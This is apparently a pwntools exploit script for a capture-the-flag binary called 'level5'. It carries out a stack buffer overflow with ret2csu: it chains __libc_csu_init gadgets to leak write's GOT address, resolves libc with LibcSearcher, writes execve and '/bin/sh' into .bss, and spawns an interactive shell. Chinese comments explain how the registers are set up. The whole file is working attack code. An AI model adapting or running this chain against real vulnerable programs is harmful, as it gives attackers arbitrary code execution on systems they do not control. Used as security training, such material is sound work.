from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
gadgets1 = 0x0000000000400600
gadgets2 = 0x000000000040061A


offset = 0x80 + 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx, rbp, r12, r13, r14, r15
    # 为了执行r12指向的指令，rbx应为0
    # 为了继续执行gadgets2，rbx应为1
    # r12指向想调用的函数
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    # lash为目标返回地址
    # 相当于func_r12(r15d, r14, r13) 执行完返回last
    payload = b'a' * offset
    payload += p64(gadgets2) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(gadgets1)
    payload += b'a' * 0x38 #56字节 越过gadgets2中对寄存器的赋值
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil(b'Hello, World\n')
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))

sh.recvuntil(b'Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')

sh.recvuntil(b'Hello, World\n')
# execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
